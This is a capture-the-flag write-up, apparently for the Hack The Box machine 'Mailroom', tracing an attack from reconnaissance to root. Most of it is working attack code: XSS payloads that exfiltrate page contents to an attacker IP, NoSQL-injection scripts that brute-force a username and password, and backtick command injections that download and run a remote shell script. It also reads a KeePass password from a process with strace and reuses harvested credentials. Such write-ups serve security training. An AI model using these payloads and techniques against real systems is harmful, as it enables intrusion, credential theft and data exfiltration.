
# Mailroom

![logo](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Mailroom/Mailroom.png)

## nmap
    
    ```
    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    |   256 19:fb:45:fe:b9:e4:27:5d:e5:bb:f3:54:97:dd:68:cf (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIImOwXljVycTwdL6fg/kkMWPDWdO+roydyEf8CeBYu7X
    80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
    |_http-server-header: Apache/2.4.54 (Debian)
    |_http-favicon: Unknown favicon MD5: 846CD0D87EB3766F77831902466D753F
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: The Mail Room
    ```
    

## Subdomain

- `wfuzz -c -u [http://mailroom.htb](http://mailroom.htb/) -H "Host: FUZZ.mailroom.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt --hw 534`

git.mailroom.htb

## Gitea Version: 1.18.0

### User: 
```
administrator
matthew
tristan
```

### Repo `staffroom`

We find the file `auth.php` at staff-review-panel.mailroom.htb

When we open this page, we get a Forbidden. 

## XSS

There is a XSS in the contact.php `Title` and `Message`

- [http://mailroom.htb/contact.php](http://mailroom.htb/contact.php)

Payload: `<script>alert(1)</script>`

### Read HTML Source Code

INFO: Use PHP Webserver `sudo php -S 0.0.0.0:80`

The idear is, send a XSS to read the HTML code from the victem. 

```jsx
<script>
var http=new XMLHttpRequest(); 
http.open('GET', 'http://10.10.14.56/?xss=' + btoa(document.body.innerHTML), true);
http.send();
</script>
```

We got the source code from the mailroom.htb side, but we the target is the staff-review-panel.mailroom.htb side becuase, its only reachable from the localhost. 

```jsx
var req=new XMLHttpRequest(); 
req.open('GET', 'http://staff-review-panel.mailroom.htb/index.php', true);
http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
http.onload = function () {
	fetch("http://10.10.14.59/?xss=" + encodeURI(btoa(this.responseText)));
};
http.send(null);
```

Save this js code in the file `pwn.js`

```jsx
<script src="http://10.10.14.56/pwn.js"></script>
```

We got the /index.php from `staff-review-panel.mailroom.htb`

Now we can access the local side over the xss.

## MongoDB SQL Injection

We see the side use a mongodb and is vulnerable to nosql inejction.

```php
// Check if the email and password are correct
$user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);
```

Now try to send a email and password to /auth.php.

Use a new file nosql.js 

```jsx
var http=new XMLHttpRequest();
http.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php', true);
http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
http.onload = function () {
	fetch("http://10.10.14.56/?xss=" + encodeURI(btoa(this.responseText)));
};
http.send("email=test@example.de&password=abc");
```

```
{"success":false,"message":"Invalid email or password"}
```

Try NoSQL Injection, change last line in `nosql.js`

```jsx
http.send("email[$ne]=test@example.de&password[$ne]=abc");
```

```
{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
```

### Brute Force Username for Email

```jsx
async function callAuth(mail) {
    var http=new XMLHttpRequest();
    http.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php', true);
    http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    http.onload = function () {
        if (/"success":true/.test(this.responseText)) {
            notify(mail);
            cal('.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-!', mail);
        }
    };
    http.send("email[$regex]=.*"+ mail +"@mailroom.htb&password[$ne]=abc");
}
function notify(mail) {
    fetch("http://10.10.14.56/?name=" + mail);
}
var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-!'
function cal(chars, mail) {
    for (var i = 0; i < chars.length; i++) {
        callAuth(chars[i] + mail)
    }
}
cal(chars, "")
```

The script ends after some time, so add in `cal(chars, "")` the output you got. Repeat that after you dont get any output back.

- Server Output
    
    ```
    10.129.229.1 - - [18/Apr/2023 11:47:22] "GET /brute_user.js HTTP/1.1" 200 -
    10.129.229.1 - - [18/Apr/2023 11:47:22] "GET /?name=tan HTTP/1.1" 200 -
    10.129.229.1 - - [18/Apr/2023 11:47:22] "GET /?name=stan HTTP/1.1" 200 -
    10.129.229.1 - - [18/Apr/2023 11:47:22] "GET /?name=.tan HTTP/1.1" 200 -
    ```
    
    Add `cal(chars, "tan")` 
    
    ```
    10.129.229.1 - - [18/Apr/2023 11:50:51] "GET /brute_user.js HTTP/1.1" 200 -
    10.129.229.1 - - [18/Apr/2023 11:50:52] "GET /?name=ristan HTTP/1.1" 200 -
    10.129.229.1 - - [18/Apr/2023 11:50:52] "GET /?name=.ristan HTTP/1.1" 200 -
    10.129.229.1 - - [18/Apr/2023 11:50:53] "GET /?name=tristan HTTP/1.1" 200 -
    ```
    

User: tristan

Email: tristan@mailroom.htb

### Brute Force Password

Same with the password. Add the strings from the output to `cal(chars, "")`

```jsx
async function callAuth(pass) {
    var http=new XMLHttpRequest();
    http.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php', true);
    http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    http.onload = function () {
        if (/"success":true/.test(this.responseText)) {
            notify(pass);
            cal('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#%\'()+:;-_~', pass);
        }
    };
    http.send("email=tristan@mailroom.htb&password[$regex]=^"+pass);
}
function notify(pass) {
    fetch("http://10.10.14.56:81/pass?" + pass);
}
//var chars = '!+,-.0123456789:;<=>ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{|}~'
var chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#%\'()+:;-_~'
function cal(chars, pass) {
    for (var i = 0; i < chars.length; i++) {
        callAuth(pass+chars[i])
    }
}
cal(chars, "")
```

PW: 69trisRulez!

We can now login via SSH.

- `sshpass -p 69trisRulez! ssh tristan@mailroom.htb`

uid=1000(tristan) gid=1000(tristan) groups=1000(tristan)

## Lateral Movement - www-data

We can now open a tunnel to use the local domain `staff-review-panel.mailroom.htb`

- `sshpass -p 69trisRulez! ssh tristan@mailroom.htb -L 81:127.0.0.1:80`

Add `staff-review-panel.mailroom.htb` to the /etc/hosts file in line 127.0.0.1

Open:

- http://staff-review-panel.mailroom.htb:81

After login with the creds we can find ower 2FA token in the file.

- `/var/mail/tristan`

```
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id 214551C51
        for <tristan@mailroom.htb>; Tue, 18 Apr 2023 11:03:53 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=a741cefcbf78af8aeb1c3dbe5fd7d330
```

Open this URL and we can view the page:

- [http://staff-review-panel.mailroom.htb:81/inspect.php](http://staff-review-panel.mailroom.htb:81/inspect.php)

We see in the source code `staffroom` from gitea. 

```php
$data = '';
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");

  // Parse the data between  and </p>
  $start = strpos($contents, '<p class="lead mb-0">');
  if ($start === false) {
    // Data not found
    $data = 'Inquiry contents parsing failed';
  } else {
    $end = strpos($contents, '</p>', $start);
    $data = htmlspecialchars(substr($contents, $start + 21, $end - $start - 21));
  }
}
```

## Command Injection

There is a filter `preg_replace()` but we can run shell commands with the Inside a command ```` charactes.

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection#inside-a-command](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#inside-a-command)

- `test `curl 10.10.14.56:88` #`

### Rev Shell

- `test `curl 10.10.14.56:88/run.sh -o /tmp/run.sh` #`
- `test `chmod +x /tmp/run.sh` #`
- `test `/tmp/run.sh` #`

uid=33(www-data) gid=33(www-data) groups=33(www-data)

We are in a docker container. 

## Lateral Movement - matthew

We know, the staffroom is in gitea, so there is a repo in this folder

- `cd /var/www/staffroom/.git`
- `cat config`

```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
[user]
        email = matthew@mailroom.htb
```

URL decode → 

PW: HueLover83#

→ user.txt

# Priv Esc

Check processes

- ps -aux

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
matthew    87118  0.3  0.2  19192  9780 ?        Ss   21:16   0:00 /lib/systemd/systemd --user
matthew    87135  0.1  0.1   8284  5248 pts/0    S    21:16   0:00 bash
```

So matthew running keepass and open the file /home/matthew/personal.kdbx

## Read password with `strace` from PID

- `strace -p `ps -elf | grep -v 'pts' | awk '/kpcli/{print $4}'``

Run this some times, because the the keepass process get restartet and closed after some minutes. 

We see the password in the `read()` outptus

```
write(1, "Please provide the master passwo"..., 36) = 36
<SNIP>
read(0, "!", 8192)                      = 1
<SNIP>
read(0, "s", 8192)                      = 1
<SNIP>
read(0, "E", 8192)                      = 1
...
```

We got the password `!sEcUr3p4$$w0rd9` for the keepass login.

- `kpcli --kdb personal.kdbx`

```
WARNING: A KeePassX-style lock file is in place for this file.
         It may be opened elsewhere. Be careful of saving!
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
Root/
kpcli:/> cd Root/
kpcli:/Root> ls
=== Entries ===
0. food account                                            door.dash.local
1. GItea Admin account                                    git.mailroom.htb
2. gitea database password
3. My Gitea Account                                       git.mailroom.htb
4. root acc
kpcli:/Root> show root acc
kpcli:/Root> show 4

Title: root acc
Uname: root
 Pass: a$gBa3!GA8
  URL:
Notes: root account for sysadmin jobs

kpcli:/Root> quit
```

Login to root.

→ root.txt
